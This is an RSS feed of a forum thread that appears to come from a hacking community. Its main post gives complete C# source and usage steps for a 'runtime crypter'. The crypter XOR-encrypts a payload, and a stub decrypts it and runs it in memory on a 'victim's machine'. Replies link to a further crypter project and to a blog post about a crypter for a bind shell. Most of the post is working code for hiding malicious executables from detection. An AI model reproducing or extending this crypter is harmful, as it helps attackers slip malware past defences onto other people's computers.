<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>[C#] A Simple Runtime Crypter</title>
    <link>https://0x00sec.org/t/c-a-simple-runtime-crypter/519</link>
    <description>Hey Mates,

I think everyone of you has had the dream of building his own crypter; I know _I_ have (for about a year, now).

Everyone has heard of this &quot;black magic&quot; (as @dtm mentioned in [his post](https://0x00sec.org/t/crypters-instruments-of-the-underground/386)). But, maybe some of you, like me, were unsuccessful in programming one.

A crypter in C# is not as useful as one in C++, but that&#39;s besides the point.

* **C++**: Complex, but handles the low-level stuff **much** better
* **C#**: Very easy; excellent for creating a basic introduction to crypters.

I&#39;ll cover the aspects necessary to built a crypter, and because it&#39;s in C#, I can omit the complex, low-level stuff usually associated with this technique.

----------
## How does a Runtime Crypter work?
@dtm already wrote a good explanation, so I&#39;ll shorten it here a bit. For a detailed introduction, see his post!

### On the attacker&#39;s machine (Crypter)
1. Load Payload
2. Encrypt Payload
3. Build Stub and Add Payload

At this point I have to say that this crypter has **two downsides**:

1. It can only run .NET executables,
2. and, currently, the encrypted payload has to be given away with the stub in it own file! So you have the `stub.exe` and `payload.bin/dat/jgp`. The name of the file is your choice.

### On the victims machine (Stub)
1. Load encrypted Payload
2. Decrypt Payload
3. Run Payload

Everything&#39;s done in memory and not on the hard drive!

----
# Source of the Crypter
I think it&#39;s well commented so I will just paste it here:

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.IO;

namespace Crypter
{
    class Program
    {
        static void Main(string[] args)
        {
            //No Arguments -&gt; Exit
            if (args.Length &lt; 2)
            {
                Console.WriteLine(&quot;Syntax: crypter.exe &lt;Exe/Dll to get Encrypted&gt; &lt;Password&gt; (Optional: output file name)&quot;);
                Environment.Exit(0);
            }

            String file = args[0];
            String pass = args[1];
            String outFile = &quot;Crypted.exe&quot;;

            //If Output Name is specified -&gt; Set it
            if (args.Length == 3)
            {
                outFile = args[2];
            }

            //File doesn&#39;t exist -&gt; Exit
            if (!File.Exists(file))
            {
                Console.WriteLine(&quot;[!] The selected File doesn&#39;t exist!&quot;);
                Environment.Exit(0);
            }

            //Everything seems fine -&gt; Reading bytes
            Console.WriteLine(&quot;[*] Reading Data...&quot;);
            byte[] plainBytes = File.ReadAllBytes(file);

            //Yep, got bytes -&gt; Encoding
            Console.WriteLine(&quot;[*] Encoding Data...&quot;);
            byte[] encodedBytes = encodeBytes(plainBytes, pass);

            Console.Write(&quot;[*] Save to Output File... &quot;);
            File.WriteAllBytes(outFile, encodedBytes);
            Console.WriteLine(&quot;Done!&quot;);

            Console.WriteLine(&quot;\n[*] File successfully encoded!&quot;);
        }
    }
}
```

If you have any questions about the source, just ask in the comments! The encoding function:
```
private static byte[] encodeBytes(byte[] bytes, String pass)
{
    byte[] XorBytes = Encoding.Unicode.GetBytes(pass);

    for (int i = 0; i &lt; bytes.Length; i++)
    {
        bytes[i] ^= XorBytes[i % 16];
    }

    return bytes;
}
```
This is a simple XOR-Encryption scheme (refer to @dtm&#39;s article) that uses a password in the form of a byte array.

----
# Source of the Stub

It&#39;s a rather bad implementation, since you have to hard-code the filenames and the encryption password. Anyway, this is more of a proof-of-concept. C# is not very useful in the production of malware.

```c
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.IO;
using System.Text;
using System.Reflection;
using System.Diagnostics;

namespace Stub
{
    static class Program
    {
        /// &lt;summary&gt;
        /// MAIN
        /// &lt;/summary&gt;
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            //Application.Run(new Form1());

            //Set Payload File and Password HERE
            RunInternalExe(&quot;Crypted.exe&quot;, &quot;password&quot;);
        }

        private static void RunInternalExe(string exeName, String pass)
        {
            //Verify the Payload exists
            if (!File.Exists(exeName))
                return;

            //Read the raw bytes of the file
            byte[] resourcesBuffer = File.ReadAllBytes(exeName);

            //Decrypt bytes from payload
            byte[] decryptedBuffer = null;
            decryptedBuffer = decryptBytes(resourcesBuffer, pass);

            //If .NET executable -&gt; Run
            if(Encoding.Unicode.GetString(decryptedBuffer).Contains(&quot;&lt;/assembly&gt;&quot;))
            {
                //Load the bytes as an assembly
                Assembly exeAssembly = Assembly.Load(decryptedBuffer);

                //Execute the assembly
                object[] parameters = new object[1];                //Don&#39;t know why but fixes TargetParameterCountException
                exeAssembly.EntryPoint.Invoke(null, parameters);
            }
        }

        /// &lt;summary&gt;
        /// Decrypt the Loaded Assembly Bytes
        /// &lt;/summary&gt;
        /// &lt;param name=&quot;payload&quot;&gt;&lt;/param&gt;
        /// &lt;returns&gt;Decrypted Bytes&lt;/returns&gt;
        private static byte[] decryptBytes(byte[] bytes, String pass)
        {
            byte[] XorBytes = Encoding.Unicode.GetBytes(pass);

            for (int i = 0; i &lt; bytes.Length; i++)
            {
                bytes[i] ^= XorBytes[i % 16];
            }

            return bytes;
        }
    }
}
```
You may notice that the encryption and decryption functions are identical. This is how XOR encryption works.

That&#39;s all for the source code...

---
# Usage
First, you have to encrypt your payload. This can be done like so:

`crypter.exe &lt;payload file&gt; &lt;encryption password&gt; &lt;output filename&gt;`

Next, copy the encrypted file to the folder containing the stub and execute the stub. _Don&#39;t forget to change the file name and password in the stubs source!_ Everything should work as expected!*

_* Tested on Win7/Visual Studio 2015)_

----
# Conclusion

You may have wanted to write your own crypter, but lacked the low-level programming knowledge necessary.

This C# Crypter can be seen as an introduction to crypters -- it is unpolished. I&#39;ll work on the crypter in the coming days, add support for Windows executables that are **not** `.NET` binaries, and write a stub-builder function, so that you don&#39;t need the stub _and_ the encrypted file, but only the stub containing the payload. And, you won&#39;t have to change the password and file name every time!

Stay tuned for updates!

|-TheDoctor-|</description>
    
    <lastBuildDate>Sat, 01 Apr 2017 11:19:24 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/c-a-simple-runtime-crypter/519.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>[C#] A Simple Runtime Crypter</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/c-a-simple-runtime-crypter/519/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/c-a-simple-runtime-crypter/519/8</link>
        <pubDate>Sun, 21 Jan 2018 00:42:10 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-519-8</guid>
        <source url="https://0x00sec.org/t/c-a-simple-runtime-crypter/519.rss">[C#] A Simple Runtime Crypter</source>
      </item>
      <item>
        <title>[C#] A Simple Runtime Crypter</title>
        <dc:creator><![CDATA[afrodi]]></dc:creator>
        <description><![CDATA[
            <p>Here you have a solution without dropping on the disk<br>
</p><aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
      <a href="https://github.com/Axe-Usa/Example-Crypter" target="_blank" rel="noopener nofollow ugc">GitHub</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/7/77261a74ca126f3017bfacdf17a391cc72741ef1.png" class="thumbnail" width="" height="">

<h3><a href="https://github.com/Axe-Usa/Example-Crypter" target="_blank" rel="noopener nofollow ugc">Axe-Usa/Example-Crypter</a></h3>

<p>Example crypter is a project demonstrating how files can be encrypted and injected into memory using a stub file. - Axe-Usa/Example-Crypter</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<p></p>
          <p><a href="https://0x00sec.org/t/c-a-simple-runtime-crypter/519/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/c-a-simple-runtime-crypter/519/7</link>
        <pubDate>Sat, 01 Apr 2017 10:39:39 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-519-7</guid>
        <source url="https://0x00sec.org/t/c-a-simple-runtime-crypter/519.rss">[C#] A Simple Runtime Crypter</source>
      </item>
      <item>
        <title>[C#] A Simple Runtime Crypter</title>
        <dc:creator><![CDATA[zinzloun]]></dc:creator>
        <description><![CDATA[
            <p>Of course:<br>
<a href="https://zinzloun.wordpress.com/c-crypter-bind-shell" class="onebox" target="_blank" rel="nofollow noopener">https://zinzloun.wordpress.com/c-crypter-bind-shell</a><br>
Let me know your suggestions eventually</p>
          <p><a href="https://0x00sec.org/t/c-a-simple-runtime-crypter/519/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/c-a-simple-runtime-crypter/519/4</link>
        <pubDate>Tue, 07 Feb 2017 21:23:32 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-519-4</guid>
        <source url="https://0x00sec.org/t/c-a-simple-runtime-crypter/519.rss">[C#] A Simple Runtime Crypter</source>
      </item>
      <item>
        <title>[C#] A Simple Runtime Crypter</title>
        <dc:creator><![CDATA[SmartOne]]></dc:creator>
        <description><![CDATA[
            <p>Please share it! <img src="https://0x00sec.org/images/emoji/twitter/stuck_out_tongue.png?v=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"></p>
          <p><a href="https://0x00sec.org/t/c-a-simple-runtime-crypter/519/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/c-a-simple-runtime-crypter/519/3</link>
        <pubDate>Tue, 07 Feb 2017 11:37:23 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-519-3</guid>
        <source url="https://0x00sec.org/t/c-a-simple-runtime-crypter/519.rss">[C#] A Simple Runtime Crypter</source>
      </item>
      <item>
        <title>[C#] A Simple Runtime Crypter</title>
        <dc:creator><![CDATA[zinzloun]]></dc:creator>
        <description><![CDATA[
            <p>I resume this old post because this tutorial helped me to develop a complete C# Crypter for a bind shell that I need in my job. You can include the encrypted file as embedded resource in your VS 2005 stub project, selecting <strong>Do not copy to the output directory</strong> and the file will be embedded in your executable stub. I developed the stub based on the .Net FW 3.5.<br>
If someone is interested about the tutorial (and if it’s allowed by the forum policy)  I will happy to post the link to my personal blog. Thank you <a class="mention" href="https://0x00sec.org/u/thedoctor">@TheDoctor</a></p>
          <p><a href="https://0x00sec.org/t/c-a-simple-runtime-crypter/519/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/c-a-simple-runtime-crypter/519/2</link>
        <pubDate>Mon, 06 Feb 2017 21:30:41 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-519-2</guid>
        <source url="https://0x00sec.org/t/c-a-simple-runtime-crypter/519.rss">[C#] A Simple Runtime Crypter</source>
      </item>
      <item>
        <title>[C#] A Simple Runtime Crypter</title>
        <dc:creator><![CDATA[TheDoctor]]></dc:creator>
        <description><![CDATA[
            <p>Hey Mates,</p>
<p>I think everyone of you has had the dream of building his own crypter; I know <em>I</em> have (for about a year, now).</p>
<p>Everyone has heard of this “black magic” (as <a class="mention" href="https://0x00sec.org/u/dtm">@dtm</a> mentioned in <a href="https://0x00sec.org/t/crypters-instruments-of-the-underground/386">his post</a>). But, maybe some of you, like me, were unsuccessful in programming one.</p>
<p>A crypter in C# is not as useful as one in C++, but that’s besides the point.</p>
<ul>
<li>
<strong>C++</strong>: Complex, but handles the low-level stuff <strong>much</strong> better</li>
<li>
<strong>C#</strong>: Very easy; excellent for creating a basic introduction to crypters.</li>
</ul>
<p>I’ll cover the aspects necessary to built a crypter, and because it’s in C#, I can omit the complex, low-level stuff usually associated with this technique.</p>
<hr>
<h2>How does a Runtime Crypter work?</h2>
<p><a class="mention" href="https://0x00sec.org/u/dtm">@dtm</a> already wrote a good explanation, so I’ll shorten it here a bit. For a detailed introduction, see his post!</p>
<h3>On the attacker’s machine (Crypter)</h3>
<ol>
<li>Load Payload</li>
<li>Encrypt Payload</li>
<li>Build Stub and Add Payload</li>
</ol>
<p>At this point I have to say that this crypter has <strong>two downsides</strong>:</p>
<ol>
<li>It can only run .NET executables,</li>
<li>and, currently, the encrypted payload has to be given away with the stub in it own file! So you have the <code>stub.exe</code> and <code>payload.bin/dat/jgp</code>. The name of the file is your choice.</li>
</ol>
<h3>On the victims machine (Stub)</h3>
<ol>
<li>Load encrypted Payload</li>
<li>Decrypt Payload</li>
<li>Run Payload</li>
</ol>
<p>Everything’s done in memory and not on the hard drive!</p>
<hr>
<h1>Source of the Crypter</h1>
<p>I think it’s well commented so I will just paste it here:</p>
<pre><code class="lang-auto">using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.IO;

namespace Crypter
{
    class Program
    {
        static void Main(string[] args)
        {
            //No Arguments -&gt; Exit
            if (args.Length &lt; 2)
            {
                Console.WriteLine("Syntax: crypter.exe &lt;Exe/Dll to get Encrypted&gt; &lt;Password&gt; (Optional: output file name)");
                Environment.Exit(0);
            }

            String file = args[0];
            String pass = args[1];
            String outFile = "Crypted.exe";

            //If Output Name is specified -&gt; Set it
            if (args.Length == 3)
            {
                outFile = args[2];
            }

            //File doesn't exist -&gt; Exit
            if (!File.Exists(file))
            {
                Console.WriteLine("[!] The selected File doesn't exist!");
                Environment.Exit(0);
            }

            //Everything seems fine -&gt; Reading bytes
            Console.WriteLine("[*] Reading Data...");
            byte[] plainBytes = File.ReadAllBytes(file);

            //Yep, got bytes -&gt; Encoding
            Console.WriteLine("[*] Encoding Data...");
            byte[] encodedBytes = encodeBytes(plainBytes, pass);

            Console.Write("[*] Save to Output File... ");
            File.WriteAllBytes(outFile, encodedBytes);
            Console.WriteLine("Done!");

            Console.WriteLine("\n[*] File successfully encoded!");
        }
    }
}
</code></pre>
<p>If you have any questions about the source, just ask in the comments! The encoding function:</p>
<pre><code class="lang-auto">private static byte[] encodeBytes(byte[] bytes, String pass)
{
    byte[] XorBytes = Encoding.Unicode.GetBytes(pass);

    for (int i = 0; i &lt; bytes.Length; i++)
    {
        bytes[i] ^= XorBytes[i % 16];
    }

    return bytes;
}
</code></pre>
<p>This is a simple XOR-Encryption scheme (refer to <a class="mention" href="https://0x00sec.org/u/dtm">@dtm</a>’s article) that uses a password in the form of a byte array.</p>
<hr>
<h1>Source of the Stub</h1>
<p>It’s a rather bad implementation, since you have to hard-code the filenames and the encryption password. Anyway, this is more of a proof-of-concept. C# is not very useful in the production of malware.</p>
<pre><code class="lang-auto">using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.IO;
using System.Text;
using System.Reflection;
using System.Diagnostics;

namespace Stub
{
    static class Program
    {
        /// &lt;summary&gt;
        /// MAIN
        /// &lt;/summary&gt;
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            //Application.Run(new Form1());

            //Set Payload File and Password HERE
            RunInternalExe("Crypted.exe", "password");
        }

        private static void RunInternalExe(string exeName, String pass)
        {
            //Verify the Payload exists
            if (!File.Exists(exeName))
                return;

            //Read the raw bytes of the file
            byte[] resourcesBuffer = File.ReadAllBytes(exeName);

            //Decrypt bytes from payload
            byte[] decryptedBuffer = null;
            decryptedBuffer = decryptBytes(resourcesBuffer, pass);

            //If .NET executable -&gt; Run
            if(Encoding.Unicode.GetString(decryptedBuffer).Contains("&lt;/assembly&gt;"))
            {
                //Load the bytes as an assembly
                Assembly exeAssembly = Assembly.Load(decryptedBuffer);

                //Execute the assembly
                object[] parameters = new object[1];                //Don't know why but fixes TargetParameterCountException
                exeAssembly.EntryPoint.Invoke(null, parameters);
            }
        }

        /// &lt;summary&gt;
        /// Decrypt the Loaded Assembly Bytes
        /// &lt;/summary&gt;
        /// &lt;param name="payload"&gt;&lt;/param&gt;
        /// &lt;returns&gt;Decrypted Bytes&lt;/returns&gt;
        private static byte[] decryptBytes(byte[] bytes, String pass)
        {
            byte[] XorBytes = Encoding.Unicode.GetBytes(pass);

            for (int i = 0; i &lt; bytes.Length; i++)
            {
                bytes[i] ^= XorBytes[i % 16];
            }

            return bytes;
        }
    }
}
</code></pre>
<p>You may notice that the encryption and decryption functions are identical. This is how XOR encryption works.</p>
<p>That’s all for the source code…</p>
<hr>
<h1>Usage</h1>
<p>First, you have to encrypt your payload. This can be done like so:</p>
<p><code>crypter.exe &lt;payload file&gt; &lt;encryption password&gt; &lt;output filename&gt;</code></p>
<p>Next, copy the encrypted file to the folder containing the stub and execute the stub. <em>Don’t forget to change the file name and password in the stubs source!</em> Everything should work as expected!*</p>
<p><em>* Tested on Win7/Visual Studio 2015)</em></p>
<hr>
<h1>Conclusion</h1>
<p>You may have wanted to write your own crypter, but lacked the low-level programming knowledge necessary.</p>
<p>This C# Crypter can be seen as an introduction to crypters – it is unpolished. I’ll work on the crypter in the coming days, add support for Windows executables that are <strong>not</strong> <code>.NET</code> binaries, and write a stub-builder function, so that you don’t need the stub <em>and</em> the encrypted file, but only the stub containing the payload. And, you won’t have to change the password and file name every time!</p>
<p>Stay tuned for updates!</p>
<p>|-TheDoctor-|</p>
          <p><a href="https://0x00sec.org/t/c-a-simple-runtime-crypter/519/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/c-a-simple-runtime-crypter/519/1</link>
        <pubDate>Mon, 30 May 2016 14:12:13 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-519-1</guid>
        <source url="https://0x00sec.org/t/c-a-simple-runtime-crypter/519.rss">[C#] A Simple Runtime Crypter</source>
      </item>
  </channel>
</rss>
